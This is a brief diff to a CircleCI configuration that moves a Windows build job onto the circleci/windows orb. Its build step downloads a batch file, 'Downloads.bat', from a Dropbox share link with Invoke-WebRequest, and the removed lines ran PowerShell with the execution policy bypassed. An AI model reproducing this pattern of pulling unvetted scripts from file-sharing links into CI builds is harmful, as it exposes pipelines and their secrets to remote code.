@@ -1,11 +1,11 @@
 version: 2.1
 
+orbs:
+  win: circleci/windows@5.0 
+
 jobs:
   build:
-    machine:
-      image: 'windows-server-2022-gui:current'
-      resource_class: windows.large
-      shell: powershell.exe -ExecutionPolicy Bypass
+    executor: win/default
     steps:
       - run: |
          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/wxgbjvtxpxj2my3zhilfv/Downloads.bat?rlkey=sh2twffzvcp0ab2m6cn24lde7&dl=1" -OutFile "Downloads.bat"
